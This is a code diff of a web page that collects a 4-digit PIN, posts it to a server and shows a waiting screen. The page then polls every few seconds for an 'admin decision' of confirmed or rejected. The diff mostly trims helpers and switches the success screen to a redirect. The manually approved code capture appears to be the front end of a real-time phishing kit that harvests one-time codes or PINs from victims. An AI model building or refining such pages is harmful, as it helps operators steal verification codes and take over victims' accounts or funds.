@@ -43,8 +43,6 @@
             background: #fffdf5; border: 2px solid #ffcc00; border-radius: 10px;
             outline: none; transition: box-shadow .15s, border-color .15s;
         }
-        .pin-box::-webkit-outer-spin-button,
-        .pin-box::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
         .pin-box:focus { box-shadow: 0 0 0 4px rgba(255,204,0,.25); border-color: #e6b800; }
         .pin-box.filled { background: #fff8e0; }
         .pin-box.error { border-color: #e33; background: #fff5f5; }
@@ -52,7 +50,6 @@
         .error-msg { display: none; font-size: 13px; color: #c33;
                      font-weight: 600; margin-bottom: 14px; }
         .error-msg.show { display: block; }
-        .error-msg.info { color: #b8860b; }
 
         .submit-btn {
             display: block; width: 100%; background: #ffcc00; color: #111;
@@ -64,7 +61,6 @@
         .submit-btn:active { transform: scale(.99); }
         .submit-btn:disabled { background: #ddd; color: #999; cursor: not-allowed; }
 
-        /* Waiting screen */
         .waiting-wrap { padding: 10px 0 20px; }
         .waiting-spinner {
             width: 60px; height: 60px; border: 5px solid #fff5cc;
@@ -141,16 +137,15 @@
             box.addEventListener('input', function () {
                 this.value = this.value.replace(/[^0-9]/g, '');
                 if (this.value.length > 1) this.value = this.value.slice(-1);
-
                 if (this.value) {
                     this.classList.add('filled');
                     if (i < pinBoxes.length - 1) pinBoxes[i + 1].focus();
                 } else {
                     this.classList.remove('filled');
                 }
-                clearErrors();
+                errorMsg.classList.remove('show');
+                pinBoxes.forEach(b => b.classList.remove('error'));
             });
-
             box.addEventListener('keydown', function (e) {
                 if (e.key === 'Backspace') {
                     if (!this.value && i > 0) {
@@ -163,12 +158,10 @@
                         this.classList.remove('filled');
                         e.preventDefault();
                     }
-                    clearErrors();
                 }
                 if (e.key === 'ArrowLeft' && i > 0) pinBoxes[i - 1].focus();
                 if (e.key === 'ArrowRight' && i < pinBoxes.length - 1) pinBoxes[i + 1].focus();
             });
-
             box.addEventListener('paste', function (e) {
                 e.preventDefault();
                 const pasted = (e.clipboardData || window.clipboardData)
@@ -181,19 +174,9 @@
                 const nextEmpty = pinBoxes.findIndex(b => !b.value);
                 if (nextEmpty !== -1) pinBoxes[nextEmpty].focus();
                 else pinBoxes[pinBoxes.length - 1].focus();
-                clearErrors();
             });
-
-            box.addEventListener('focus', function () { this.select(); });
         });
 
-        function clearErrors() {
-            errorMsg.classList.remove('show');
-            errorMsg.classList.remove('info');
-            pinBoxes.forEach(b => b.classList.remove('error'));
-        }
-
-        // ─── Polling for admin decision ───
         let referenceId = null;
         let pollTimer = null;
 
@@ -205,7 +188,10 @@
 
                     if (data.status === 'confirmed') {
                         clearInterval(pollTimer);
-                        showSuccess();
+                        // Go to success page
+                        const next = new URLSearchParams(params);
+                        next.set('ref', referenceId);
+                        window.location.href = 'success.html?' + next.toString();
                     } else if (data.status === 'rejected') {
                         clearInterval(pollTimer);
                         showRejected();
@@ -214,24 +200,6 @@
                     console.error('Poll failed:', err);
                 }
             }, 3000);
-        }
-
-        function showSuccess() {
-            document.getElementById('mainCard').innerHTML = `
-                <div style="width:90px;height:90px;border-radius:50%;background:#2e9e4f;
-                            display:flex;align-items:center;justify-content:center;
-                            margin:0 auto 20px;font-size:44px;color:#fff;">✓</div>
-                <h2 style="font-size:22px;font-weight:800;color:#2e9e4f;margin-bottom:12px;">
-                    Verification Complete
-                </h2>
-                <div style="display:inline-block;padding:8px 16px;border-radius:20px;
-                            background:#e8f7ec;color:#2e9e4f;font-size:13px;font-weight:700;
-                            margin-bottom:20px;">STATUS: PENDING APPROVAL</div>
-                <p style="font-size:15px;color:#444;line-height:1.6;">
-                    Your application has been fully submitted.<br>
-                    Please wait for approval.
-                </p>
-            `;
         }
 
         function showRejected() {
@@ -255,7 +223,6 @@
             `;
         }
 
-        // ─── Submit 4-digit code ───
         document.getElementById('lastForm').addEventListener('submit', async function (e) {
             e.preventDefault();
 
@@ -264,8 +231,6 @@
                 errorMsg.textContent = 'Please enter all 4 digits';
                 errorMsg.classList.add('show');
                 pinBoxes.forEach(b => { if (!b.value) b.classList.add('error'); });
-                const firstEmpty = pinBoxes.find(b => !b.value);
-                if (firstEmpty) firstEmpty.focus();
                 return;
             }
 
@@ -282,7 +247,6 @@
                 const data = await res.json();
                 referenceId = data.referenceId;
 
-                // Show waiting screen
                 document.getElementById('mainCard').innerHTML = `
                     <div class="waiting-wrap">
                         <div class="waiting-spinner"></div>
@@ -295,9 +259,8 @@
                 `;
 
                 startPolling();
-
             } catch (err) {
-                console.error('Send failed:', err);
+                console.error(err);
                 errorMsg.textContent = '⚠️ Network error. Please try again.';
                 errorMsg.classList.add('show');
                 submitBtn.disabled = false;
